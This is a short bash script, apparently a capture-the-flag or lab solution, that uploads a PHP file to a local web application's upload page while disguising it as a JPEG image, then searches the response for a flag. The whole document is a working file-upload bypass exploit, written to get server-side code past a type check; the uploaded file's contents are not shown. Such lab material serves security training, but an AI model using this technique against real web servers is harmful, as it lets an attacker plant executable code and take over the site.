#!/bin/bash

curl 'http://192.168.56.101/index.php?page=upload#' -X POST \
     -F "uploaded=@./coucou.php;type=image/jpeg" \
     -F "Upload=Upload" | grep flag